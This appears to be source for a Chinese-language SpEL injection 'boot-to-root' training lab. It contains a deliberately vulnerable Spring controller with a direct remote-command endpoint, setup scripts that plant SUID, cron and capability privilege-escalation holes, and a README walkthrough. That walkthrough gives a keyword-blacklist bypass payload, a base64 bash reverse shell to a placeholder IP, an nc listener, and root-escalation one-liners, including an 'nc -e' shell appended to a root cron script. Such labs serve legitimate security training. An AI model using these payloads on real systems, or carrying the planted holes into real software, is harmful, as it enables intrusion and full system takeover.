export const SPEL_CONTROLLER_CODE = `package com.example.spel.controller;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.*;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.beans.factory.annotation.Autowired;
import java.util.Date;
import java.util.Arrays;
import java.util.List;
import javax.servlet.http.HttpServletRequest;

@RestController
@RequestMapping("/spel/vuln")
public class SpelController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    /**
     * Level 1: 直接注入 (Direct Injection)
     * 适合入门，直接执行表达式
     */
    @GetMapping("/direct")
    public String direct(@RequestParam String expression, HttpServletRequest request) {
        return executeSpel(expression, request, "DIRECT");
    }

    /**
     * Level 2: 拼接注入 (Concat Injection)
     * 需要闭合单引号和括号
     */
    @GetMapping("/concat")
    public String concat(@RequestParam String expression, HttpServletRequest request) {
        String template = "Hello, ('" + expression + "')!";
        return executeSpel(template, request, "CONCAT");
    }

    /**
     * Level 3: 黑名单绕过 (WAF Bypass)
     * 过滤了: Runtime, exec, ProcessBuilder, cmd, bash, sh
     * 挑战: 使用 String 拼接, 反射, 或 ScriptEngine
     */
    @GetMapping("/bypass")
    public String bypass(@RequestParam String expression, HttpServletRequest request) {
        String lower = expression.toLowerCase();
        List<String> blackList = Arrays.asList("runtime", "exec", "processbuilder", "cmd", "bash", "sh");
        
        for (String keyword : blackList) {
            if (lower.contains(keyword)) {
                logAttack(expression, "BLOCKED: " + keyword, request.getRemoteAddr());
                return "WAF Error: Malicious keyword detected [" + keyword + "]";
            }
        }
        return executeSpel(expression, request, "BYPASS");
    }

    /**
     * Level 4: 盲注 (Blind Injection)
     * 无论成功失败，只返回 "Processed"
     * 挑战: 基于时间的盲注 (Thread.sleep) 或 OOB
     */
    @GetMapping("/blind")
    public String blind(@RequestParam String expression, HttpServletRequest request) {
        try {
            ExpressionParser parser = new SpelExpressionParser();
            parser.parseExpression(expression).getValue(String.class);
            // 不返回结果
            logAttack(expression, "BLIND_SUCCESS", request.getRemoteAddr());
        } catch (Exception e) {
            logAttack(expression, "BLIND_ERROR", request.getRemoteAddr());
        }
        return "Request Processed.";
    }

    /**
     * RCE 演示接口
     */
    @GetMapping("/rce")
    public String rce(@RequestParam String cmd, HttpServletRequest request) {
        String rcePayload = "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + cmd + "').getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next()";
        logAttack(cmd, "RCE_ATTEMPT", request.getRemoteAddr());
        try {
            ExpressionParser parser = new SpelExpressionParser();
            String result = parser.parseExpression(rcePayload).getValue(String.class);
            return "Output:\\n" + result;
        } catch (Exception e) {
             return "Failed: " + e.getMessage();
        }
    }

    // 统一执行逻辑
    private String executeSpel(String expression, HttpServletRequest request, String type) {
        logAttack(expression, "PROCESSING_" + type, request.getRemoteAddr());
        try {
            ExpressionParser parser = new SpelExpressionParser();
            String result = parser.parseExpression(expression).getValue(String.class);
            logAttack(expression, "SUCCESS: " + result, request.getRemoteAddr());
            return result;
        } catch (Exception e) {
            logAttack(expression, "ERROR: " + e.getMessage(), request.getRemoteAddr());
            return "Error: " + e.getMessage();
        }
    }

    private void logAttack(String expression, String result, String ip) {
        try {
            String safeResult = (result != null && result.length() > 255) ? result.substring(0, 255) : result;
            jdbcTemplate.update(
                "INSERT INTO search_logs (expression, result, ip_address, created_at) VALUES (?, ?, ?, ?)",
                expression, safeResult, ip, new Date()
            );
        } catch (Exception e) {
            // ignore
        }
    }
}`;

export const SPEL_APP_JAVA_CODE = `package com.example.spel;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class SpelLabApplication {
    public static void main(String[] args) {
        SpringApplication.run(SpelLabApplication.class, args);
    }
}`;

export const POM_XML_CODE = `<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" 
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>spel-lab</artifactId>
    <version>1.0.0</version>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.18</version>
    </parent>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-jdbc</artifactId>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.49</version>
        </dependency>
    </dependencies>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>`;

export const DOCKER_COMPOSE_CODE = `version: '3'
services:
  mysql:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: spel_db
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - spel-net
    healthcheck:
      test: ["CMD", "mysqladmin" ,"ping", "-h", "localhost"]
      timeout: 20s
      retries: 10

  spel_app:
    build: .
    ports:
      - "8080:8080"
    depends_on:
      mysql:
        condition: service_healthy
    environment:
      SPRING_DATASOURCE_URL: jdbc:mysql://mysql:3306/spel_db?useSSL=false
      SPRING_DATASOURCE_USERNAME: root
      SPRING_DATASOURCE_PASSWORD: root
      # FLAG 1: 隐藏在环境变量中
      APP_SECRET_FLAG: "flag{env_variables_are_not_secure}"
    volumes:
      - ./setup_suid.sh:/opt/setup_suid.sh
      - ./setup_cron.sh:/opt/setup_cron.sh
      - ./setup_caps.sh:/opt/setup_caps.sh
    # 启动顺序：Crond -> SUID -> Cron -> Caps -> Java
    command: sh -c "crond && chmod +x /opt/setup_*.sh && /opt/setup_suid.sh && /opt/setup_cron.sh && /opt/setup_caps.sh && java -jar /app.jar"
    networks:
      - spel-net
    restart: always

networks:
  spel-net:
    driver: bridge`;

export const SETUP_SCRIPTS_CODE = `#!/bin/bash
# ---------------------------------------------------------
# setup_suid.sh - SUID 提权 (Classic)
cp /usr/bin/find /tmp/custom_find
chmod u+s /tmp/custom_find
echo "[+] SUID set on /tmp/custom_find"

# ---------------------------------------------------------
# setup_cron.sh - Cron 提权 (Configuration Error)
echo "#!/bin/sh" > /opt/cleanup.sh
echo "rm -rf /tmp/*.tmp" >> /opt/cleanup.sh
# 故意设置 777 权限
chmod 777 /opt/cleanup.sh
echo "* * * * * /opt/cleanup.sh" >> /etc/crontabs/root
chmod 600 /etc/crontabs/root
echo "[+] Cron job configured (Writable Script)"

# ---------------------------------------------------------
# setup_caps.sh - Capabilities 提权 (Modern)
# 给 Python 设置 cap_setuid 能力
# 这允许 python 进程像 SUID 一样更改 UID
apk add --no-cache libcap
setcap cap_setuid+ep /usr/bin/python3
echo "[+] Capabilities set on /usr/bin/python3 (cap_setuid+ep)"

# ---------------------------------------------------------
# Flag Setup
echo "flag{root_filesystem_access_granted}" > /root/flag.txt
chmod 600 /root/flag.txt`;

export const DOCKERFILE_CODE = `FROM openjdk:8-jdk-alpine
VOLUME /tmp
# 安装渗透所需的丰富环境
# bash/curl: 基础交互
# busybox-extras: telnet/netstat
# libcap: 用于设置 Capabilities
# python3: 用于 Capabilities 提权演示
RUN apk add --no-cache bash curl busybox-extras libcap python3
COPY target/spel-lab-1.0.0.jar app.jar
ENTRYPOINT ["java","-jar","/app.jar"]`;

export const INIT_SQL_CODE = `CREATE TABLE IF NOT EXISTS search_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    expression VARCHAR(255),
    result VARCHAR(255),
    ip_address VARCHAR(50),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);`;

export const BUILD_SCRIPT = `#!/bin/bash
set -e

echo "[*] 启动 SpEL 靶场构建程序 (Real World Edition)..."

# 1. Check Docker
if ! command -v docker &> /dev/null; then
    echo "[!] 未检测到 Docker，正在安装..."
    curl -fsSL https://get.docker.com | sh
fi

# 2. Setup Dirs
BASE_DIR="spel-lab-env"
mkdir -p $BASE_DIR/src/main/java/com/example/spel/controller
cd $BASE_DIR

# 3. Write Files
echo "${POM_XML_CODE}" > pom.xml
echo "${DOCKERFILE_CODE}" > Dockerfile
echo "${DOCKER_COMPOSE_CODE}" > docker-compose.yml
echo "${INIT_SQL_CODE}" > init.sql

# Setup Scripts
cat > setup_suid.sh << 'EOF'
#!/bin/sh
cp /usr/bin/find /tmp/custom_find
chmod u+s /tmp/custom_find
EOF

cat > setup_cron.sh << 'EOF'
#!/bin/sh
echo "#!/bin/sh" > /opt/cleanup.sh
echo "rm -rf /tmp/*.tmp" >> /opt/cleanup.sh
chmod 777 /opt/cleanup.sh
echo "* * * * * /opt/cleanup.sh" >> /etc/crontabs/root
chmod 600 /etc/crontabs/root
EOF

cat > setup_caps.sh << 'EOF'
#!/bin/sh
# 确保安装了 libcap 和 python3 (Dockerfile已处理，但为了稳健)
apk add --no-cache libcap python3
setcap cap_setuid+ep /usr/bin/python3
echo "flag{root_filesystem_access_granted}" > /root/flag.txt
chmod 600 /root/flag.txt
EOF

# Java Source
cat > src/main/java/com/example/spel/controller/SpelController.java << 'EOF'
${SPEL_CONTROLLER_CODE}
EOF

cat > src/main/java/com/example/spel/SpelLabApplication.java << 'EOF'
${SPEL_APP_JAVA_CODE}
EOF

# 4. Build
echo "[*] 正在构建并启动容器 (Build & Up)..."
docker-compose up -d --build

echo ""
echo "############################################################"
echo "#                                                          #"
echo "#          SPEL INJECTION LAB: TARGET ACQUIRED             #"
echo "#                                                          #"
echo "############################################################"
echo ""
echo "   [STATUS] 目标已上线!"
echo "   [TARGET] http://<本机IP>:8080/spel/vuln/direct"
echo ""
echo "   >>> 渗透规则 <<<"
echo "   1. 不要看源码! 把这当成一个黑盒测试。"
echo "   2. 使用 nmap 扫描端口。"
echo "   3. 找到 HTTP 服务，寻找注入点。"
echo "   4. 拿到 Shell 后，寻找 SUID 或 Capabilities 提权。"
echo ""
echo "   Good Luck, Have Fun."
echo "============================================================"
`;

export const README_CODE = `# Ultimate SpEL Injection Lab (Boot-to-Root)

这是一个完整的 **Web 渗透 + 权限提升** 实战靶场。

---

## 🏗️ 部署指南
在你的 Kali Linux 或 Docker 环境中运行：
\`\`\`bash
chmod +x install_lab.sh && ./install_lab.sh
\`\`\`
靶场将在 **8080** 端口启动。

---

## ⚔️ 攻击全流程攻略 (Kill Chain)

### 第一阶段：Web 渗透 (获取初始 Shell)

**目标接口**: \`/spel/vuln/bypass?expression=...\`
**防御机制**: WAF 过滤了 \`Runtime\`, \`exec\`, \`ProcessBuilder\` 等关键字。

#### 1. 绕过 WAF 思路
由于 Java 支持反射 (Reflection) 且允许字符串拼接，我们可以将敏感关键字拆分。
- **原始目标**: \`T(java.lang.Runtime).getRuntime().exec("...")\`
- **绕过 Payload**:
  \`\`\`java
  T(String).getClass().forName("java.lang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke( ... )
  \`\`\`

#### 2. 构造反弹 Shell (RCE)
Java 的 \`Runtime.exec\` 默认不支持管道符 (\`|\`) 和重定向 (\`>\`)。必须使用 Base64 编码技巧。

1. **生成 Payload (在攻击机上)**:
   \`\`\`bash
   # 将下面的 IP 修改为你的攻击机 IP
   echo "bash -i >& /dev/tcp/192.168.x.x/4444 0>&1" | base64
   # 假设结果为: YmFzaCAtaSA+JiAvZGV2L3RjcC8uLi4vNDQ0NCAwPiYx
   \`\`\`

2. **最终利用 Payload (URL Encode 后发送)**:
   \`\`\`java
   T(org.springframework.util.StreamUtils).copy(T(String).getClass().forName("java.lang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.lang.Ru"+"ntime").getMethod("getRuntime").invoke(null),new String[]{"/bin/bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8uLi4vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"}).getInputStream(), T(java.lang.System).out)
   \`\`\`

3. **接收 Shell**:
   \`\`\`bash
   nc -lvnp 4444
   \`\`\`

---

### 第二阶段：后渗透 (信息收集)

成功获取 Shell 后，你是一个低权限用户 (通常为 root，但在 Docker 内受限)。

1. **寻找 Flag 1**:
   \`\`\`bash
   env | grep FLAG
   # APP_SECRET_FLAG=flag{env_variables_are_not_secure}
   \`\`\`

---

### 第三阶段：权限提升 (Root The Box)

靶场内部预设了三种提权漏洞，你需要发现并利用它们。

#### 1. SUID 提权 (/tmp/custom_find)
- **发现**: \`find / -perm -u=s -type f 2>/dev/null\`
- **利用**:
  \`\`\`bash
  /tmp/custom_find . -exec /bin/sh -p \; -quit
  # 此时你拥有了 euid=0
  \`\`\`

#### 2. Capabilities 提权 (Python3)
- **发现**: \`getcap -r / 2>/dev/null\`
- **结果**: \`/usr/bin/python3 = cap_setuid+ep\`
- **利用**:
  \`\`\`bash
  python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  # 完整的 Root 权限
  \`\`\`

#### 3. Cron Job 提权
- **发现**: \`cat /etc/crontabs/root\` 发现每分钟执行 \`/opt/cleanup.sh\`。
- **发现**: \`ls -la /opt/cleanup.sh\` 发现该脚本权限为 777 (全员可写)。
- **利用**:
  \`\`\`bash
  echo "nc -e /bin/sh 192.168.x.x 5555" >> /opt/cleanup.sh
  # 等待 1 分钟，接收反弹 Shell
  \`\`\`

---

## 🚩 最终目标
读取 Root Flag:
\`\`\`bash
cat /root/flag.txt
\`\`\`
`;